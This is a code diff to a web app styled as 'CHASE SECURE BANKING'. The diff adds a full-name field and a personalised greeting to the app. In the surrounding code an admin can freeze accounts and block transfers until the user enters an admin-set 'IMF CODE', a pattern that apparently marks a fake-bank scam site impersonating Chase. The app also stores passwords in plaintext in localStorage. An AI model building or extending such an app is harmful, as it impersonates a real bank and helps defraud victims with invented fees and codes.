@@ -989,6 +989,7 @@
           const usernameInput = document.getElementById('signup-username').value.trim();
           const passwordInput = document.getElementById('signup-password').value;
           const emailInput = document.getElementById('signup-email').value.trim();
+          const fullNameInput = document.getElementById('signup-fullname').value.trim();
           
           if(usernameInput.includes('@')) { signupError.textContent = "Username cannot be an email address."; signupError.style.display = 'block'; return; }
 
@@ -998,7 +999,20 @@
           const uniqueAccountNum = Math.floor(1000 + Math.random() * 9000);
           const uniqueCcNum = Math.floor(1000 + Math.random() * 9000);
           
-          const newUser = { username: usernameInput, password: passwordInput, email: emailInput, accountNum: uniqueAccountNum, ccNum: uniqueCcNum, phone: '(555) 000-0000', address: 'N/A', balance: 0, transactions: [], alerts: [], status: 'active' };
+          const newUser = { 
+              username: usernameInput, 
+              password: passwordInput, 
+              email: emailInput, 
+              fullName: fullNameInput, 
+              accountNum: uniqueAccountNum, 
+              ccNum: uniqueCcNum, 
+              phone: '(555) 000-0000', 
+              address: 'N/A', 
+              balance: 0, 
+              transactions: [], 
+              alerts: [],
+              status: 'active'
+          };
 
           users.push(newUser);
           localStorage.setItem('chase_users', JSON.stringify(users));
@@ -1024,7 +1038,6 @@
           if (!foundUser) { loginError.textContent = "Username not found. Please sign up first."; loginError.style.display = 'block'; return; }
           if (foundUser.password !== typedPass) { loginError.textContent = "Incorrect password."; loginError.style.display = 'block'; return; }
 
-          // Check if admin froze/suspended
           if (foundUser.status === 'suspended' || foundUser.status === 'frozen') {
             loginError.textContent = "Your account is currently " + foundUser.status + ". Please contact support.";
             loginError.style.display = 'block';
@@ -1065,8 +1078,11 @@
         const userLocale = navigator.language || 'en-US';
         const dateString = now.toLocaleDateString(userLocale, options);
         
-        // Time-sensitive greeting with username
-        document.getElementById('greeting-text').textContent = `${greetingPrefix}, ${user.username}`;
+        // Use fullName if available, otherwise fallback to username
+        const displayName = user.fullName || user.username;
+        
+        // Time-sensitive greeting with full name
+        document.getElementById('greeting-text').textContent = `${greetingPrefix}, ${displayName}`;
         document.getElementById('date-text').textContent = dateString;
         
         document.getElementById('bank-acct-name-display').innerHTML = `CHASE SECURE BANKING (...${user.accountNum}) <svg style="width:12px;height:12px;display:inline-block;vertical-align:middle;fill:#333;" viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>`;
@@ -1199,31 +1215,27 @@
       document.getElementById('trigger-wire').addEventListener('click', () => { dashboardPage.classList.remove('show-pay'); dashboardPage.classList.add('show-wire'); });
 
       // --- TRANSFER LOGIC WITH VERIFICATION ---
-      let pendingTransfer = null; // Holds transfer data while waiting for verification
+      let pendingTransfer = null; 
 
       function initiateTransfer(amount, recipient, type) {
         let user = JSON.parse(localStorage.getItem('chase_current_user'));
         
-        // Fetch live status from admin
         let allUsers = JSON.parse(localStorage.getItem('chase_users') || '[]');
         let liveUser = allUsers.find(u => u.username === user.username);
 
-        // 1. Check if Admin set the account to Frozen or Suspended
         if (liveUser && (liveUser.status === 'frozen' || liveUser.status === 'suspended')) {
             document.getElementById('access-restricted-overlay').classList.add('active');
             return false;
         }
 
-        // 2. Check if Admin enabled Auth Verification
         if (liveUser && liveUser.enableAuth && liveUser.authCodeValue) {
-            pendingTransfer = { amount, recipient, type }; // Store for later
+            pendingTransfer = { amount, recipient, type }; 
             document.getElementById('verify-auth-name-display').textContent = liveUser.authName || 'IMF CODE';
-            document.getElementById('verify-code-input').value = ''; // clear input
+            document.getElementById('verify-code-input').value = ''; 
             document.getElementById('verify-overlay').classList.add('active');
-            return false; // Stop here, wait for code
+            return false; 
         }
 
-        // 3. If no auth required, process immediately
         executeTransfer(amount, recipient, type);
       }
 
@@ -1252,7 +1264,6 @@
         if (!user.transactions) user.transactions = [];
         user.transactions.unshift(tx);
 
-        // ADD ALERT
         let alertObj = {
             date: now.toISOString(),
             title: "Transaction Alert",
@@ -1266,7 +1277,6 @@
         let idx = users.findIndex(u => u.username === user.username);
         if (idx > -1) { users[idx] = user; localStorage.setItem('chase_users', JSON.stringify(users)); }
 
-        // Show Success Alert & Refresh
         alert(`Transfer Successful!\n\nAmount: $${amount.toFixed(2)}\nSent to: ${recipient}\nDate: ${dateStr}\nRef: ${refId}`);
         
         document.getElementById('dashboard-page').classList.remove('show-internal', 'show-external', 'show-zelle', 'show-wire', 'show-sapphire');
@@ -1275,7 +1285,6 @@
         return true;
       }
 
-      // Handle Verify Button Click
       document.getElementById('btn-verify-submit').addEventListener('click', () => {
           let user = JSON.parse(localStorage.getItem('chase_current_user'));
           let allUsers = JSON.parse(localStorage.getItem('chase_users') || '[]');
@@ -1297,7 +1306,6 @@
           pendingTransfer = null;
       };
 
-      // Form Handlers
       document.getElementById('internal-form').addEventListener('submit', (e) => {
         e.preventDefault();
         let amount = parseFloat(document.getElementById('internal-amount').value);
